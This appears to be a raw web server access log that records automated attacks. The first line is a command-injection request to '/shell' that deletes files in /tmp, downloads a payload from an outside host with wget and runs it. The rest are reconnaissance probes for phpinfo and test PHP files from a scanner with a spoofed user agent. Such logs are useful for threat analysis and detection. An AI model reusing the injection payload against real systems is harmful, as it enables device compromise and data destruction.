::ffff:41.35.132.165 - - [05/Jan/2023:00:15:44 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" - - "-" "Hello, world"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /phpinfo.php3 HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /php_info.php HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /phpinfo.php4 HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /test.php HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /phpinfo.php5 HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /i.php HTTP/1.1" 404 144 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /phpinfos.php HTTP/1.1" 404 151 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /asdf.php HTTP/1.1" 404 147 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:21 +0000] "GET /phptest.php HTTP/1.1" 404 150 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:22 +0000] "GET /pinfo.php HTTP/1.1" 404 148 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:22 +0000] "GET /pi.php HTTP/1.1" 404 145 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
::ffff:13.212.206.28 - - [05/Jan/2023:00:20:22 +0000] "GET /phpversion.php HTTP/1.1" 404 153 "-" "Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36"
